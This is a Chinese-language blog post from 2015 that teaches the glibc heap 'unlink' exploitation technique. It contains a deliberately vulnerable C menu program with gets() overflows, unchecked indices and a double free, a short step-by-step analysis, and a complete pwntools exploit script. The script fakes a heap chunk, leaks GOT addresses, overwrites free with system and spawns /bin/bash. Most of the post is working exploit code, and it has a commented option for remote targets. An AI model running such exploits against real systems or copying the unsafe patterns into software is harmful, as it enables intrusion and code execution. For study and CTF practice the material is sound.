---
layout: post
title: "unlink"
date: 2015-08-22 07:21:46 -0700
comments: true
categories: 
---

#unlink 的利用

源程序源自http://drops.wooyun.org/binary/7958
##0x00	漏洞利用程序
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	char *a[2010];
	int i=2000;
	void Malloc(void);
	void Free(void);
	void Edit(void);
	void Print(void);

	int main(void)
	{
		char c;
		setbuf(stdout,NULL);
		while (1)
		{
			printf("What is you choose?\n");
			scanf("%c",&c);
			getchar();
			if(c == 'm')
			{
				Malloc();
			}
			else if(c == 'f')
			{
				Free();
			}
			else if(c == 'e')
			{
				Edit();
			}
			else if(c == 'p')
			{
				Print();
			}
			else
			{
				break;
			}
		}
		printf("end\n");
	}

	void Malloc(void)
	{
		int q;
		printf("now i malloc a heap\n");

		printf("enter the size of chunk\n");		
		scanf("%d",&q);
		getchar();

		a[i] = (char *)malloc(q);
		printf("enter you code\n");
		gets(a[i]);
		i++;
		printf("OK!\n");
	}

	void Free(void)
	{
		int j;
		//printf("now i free a heap\n");
		printf("which heap do you want to free?\n");
		
		scanf("%d",&j);
		getchar();

		free(a[j+2000]);
		printf("Ok!\n");
	}

	void Edit(void)
	{
		int j;
		printf("which heap do you want to edit?\n");
		scanf("%d",&j);
		getchar();
		gets(a[j+2000]);
		printf("Ok!\n");
	}
	void Print(void)
	{
		int j;
		printf("which heap do you wnat to show?\n");
		scanf("%d",&j);
		getchar();
		printf("%s\n",a[j+2000]);
		printf("end\n");
	}

##0x01	分析
存在double free漏洞，
0.先malloc两个chunk
1.后free这两个chunk
2.在申请一个比第一个大的chunk并溢出，在第一个chunk头后伪造一个chunk使fd  = ptr - 0xc, bk = ptr - 0x8, 修改chunk2的pre_size和size欺骗free
3.在申请一个chunk，来存放/bin/bash
4.free 第二个chunk,造成ulink,并使 *ptr = ptr - 0xc
5.再对ptr写入就可将ptr改为任意地址，这里改为free@got.plt
6.使用print功能打印出got.plt表
7.在将计算好的地址覆写got.plt，将free改为system地址，再free chunk4就可以得到shell

这这里我是用本地libc来实验，将__isoc99_scanf改为了scanf 

##0x02	payload

以下是payload

	from pwn import *
	from binascii import *


	def log(m):
		print "[+]" + m

	free = 0x00073880
	system = 0x0003B160
	scanf_99 = 0x0005E040 

	r = process("./a.out")
	#r = remote("127.0.0.1", 9999)

	log("malloc1")
	print r.readuntil("?\n")
	r.send("m\n")
	print r.readuntil("chunk\n")
	r.send("504\n")
	print r.readuntil("code\n")
	r.send("aaa\n")

	log("malloc2")
	print r.readuntil("?\n")
	r.send("m\n")
	print r.readuntil("chunk\n")
	r.send("512\n")
	print r.readuntil("code\n")
	r.send("aaa\n")


	log("free1")
	print r.readuntil("?\n")
	r.send("f\n")
	print r.readuntil("free?\n")
	r.sendline("0")

	log("free2")
	print r.readuntil("?\n")
	r.send("f\n")
	print r.readuntil("free?\n")
	r.sendline("1")

	log("malloc 3")
	print r.readuntil("?\n")
	r.send("m\n")
	print r.readuntil("chunk\n")
	r.send("768\n")
	print r.readuntil("code\n")
	data  = p32(0x00000000)  + p32(0x000001f9) + p32(0x0804bfc0 - 0xc) + p32(0x0804bfc0 - 0x8) + 'a'*(0x200-24) + p32(0x000001f8) + p32(0x00000108)
	data += '\n'
	r.send(data)

	log("malloc 4")
	print r.readuntil("?\n")
	r.send("m\n")
	print r.readuntil("chunk\n")
	r.send("20\n")
	print r.readuntil("code\n")
	r.sendline("/bin/bash")


	log("free first again")
	print r.readuntil("?\n")
	r.send("f\n")
	print r.readuntil("free?\n")
	r.sendline("1")

	log("edit")
	print r.readuntil("?\n")
	r.send("e\n")
	r.sendline("0")
	print r.readuntil("edit?\n")
	r.sendline("aaaabbbbcccc\x14\xa0\x04\x08")

	log("print")
	print r.readuntil("?\n")
	r.sendline("p")
	print r.readuntil("show?\n")
	r.sendline("0")

	recvdata = r.readuntil("end\n")
	print len(recvdata)

	free_addr = 0xffffffff & u32( recvdata[0 : 4] )  
	free_addr = p32(system - free + free_addr )
	print b2a_hex(free_addr)
	getchar = p32( 0xffffffff & u32( recvdata[4 : 8] ) ) 
	print b2a_hex(getchar) 
	chk = p32( 0xffffffff & u32( recvdata[8 : 12] ) ) 
	print b2a_hex(chk)
	malloc = p32( 0xffffffff & u32( recvdata[12 : 16] ) ) 
	print b2a_hex(malloc)
	puts = p32( 0xffffffff & u32( recvdata[16 : 20] ) ) 
	print b2a_hex(puts)
	gmonstart = p32( 0xffffffff & u32( recvdata[20 : 24] ) ) 
	print b2a_hex(gmonstart)
	libmain = p32( 0xffffffff & u32( recvdata[24 : 28] ) ) 
	print b2a_hex(libmain)
	scanf = p32( scanf_99 + u32( recvdata[0: 4] ) - free ) 
	print b2a_hex(scanf)


	data = free_addr + getchar + chk + malloc + puts + gmonstart + libmain + scanf

	log("edit")
	print r.readuntil("choose?\n")
	r.send("e\n")
	print r.readuntil("edit?\n")
	r.sendline("0")
	r.sendline(data)

	log("edit")
	print r.readuntil("choose?\n")
	r.send("f\n")
	print r.readuntil("free?\n")
	r.sendline("3")

	r.interactive()
